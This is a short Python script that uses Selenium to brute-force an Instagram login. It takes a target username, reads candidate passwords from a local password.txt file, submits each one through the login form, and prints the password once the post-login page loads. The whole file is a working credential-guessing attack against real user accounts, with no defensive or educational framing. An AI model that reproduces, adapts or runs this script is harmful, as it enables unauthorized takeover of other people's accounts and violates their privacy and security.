
from time import sleep

from selenium import webdriver
from selenium.webdriver.common.keys import Keys

browser = webdriver.Chrome()



browser.get('https://www.instagram.com/accounts/login/')

sleep(2)
user = input("Enter username/Email/Phone Number:- ")
passwords = open("password.txt","r")
pass_list = list(passwords.read().split("\n"))

username_input = browser.find_element_by_css_selector("input[name='username']")

password_input = browser.find_element_by_css_selector("input[name='password']")
login_button = browser.find_element_by_xpath("//button[@type='submit']")

username_input.send_keys(user)

for i in range(0,len(pass_list)):
    for j in range(0,20):
        password_input.send_keys(Keys.BACK_SPACE)

    password_input.send_keys(pass_list[i])

    login_button.click()
    sleep(3)
    uname = browser.current_url
    if uname == "https://www.instagram.com/accounts/onetap/?next=%2F":
        print("Logging success")
        print("Correct Password is {}".format(pass_list[i]))
        exit()
    else:
        print("Not Success")
sleep(5)
browser.close()
